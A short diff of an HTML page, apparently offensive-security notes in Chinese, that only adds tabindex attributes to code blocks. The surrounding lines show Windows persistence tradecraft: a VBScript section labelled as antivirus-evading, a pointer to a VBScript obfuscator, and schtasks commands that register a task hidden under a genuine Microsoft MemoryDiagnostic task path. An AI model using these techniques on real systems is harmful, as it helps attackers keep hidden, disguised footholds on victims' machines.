@@ -104,7 +104,7 @@
 <h2 id=注册任务>注册任务</h2>
 <h3 id=脚本免杀>脚本（免杀）</h3>
 <h4 id=123vbs>123.vbs</h4>
-<pre><code>Set service = CreateObject(&quot;Schedule.Service&quot;)
+<pre tabindex=0><code>Set service = CreateObject(&quot;Schedule.Service&quot;)
 service.Connect
 
 Set file = CreateObject(&quot;Scripting.FileSystemObject&quot;).OpenTextFile(&quot;123.xml&quot;)
@@ -125,7 +125,7 @@ cscript.exe：输出至 Console。
 <li><a href=https://github.com/DoctorLai/VBScript_Obfuscator>https://github.com/DoctorLai/VBScript_Obfuscator</a></li>
 </ul>
 <h3 id=工具>工具</h3>
-<pre><code>schtasks.exe /create /tn &quot;\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents&quot; /f /xml 123.xml
+<pre tabindex=0><code>schtasks.exe /create /tn &quot;\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents&quot; /f /xml 123.xml
 schtasks.exe /query  /tn &quot;\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents&quot; /v /fo list
 schtasks.exe /delete /tn &quot;\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents&quot; /f
 </code></pre>
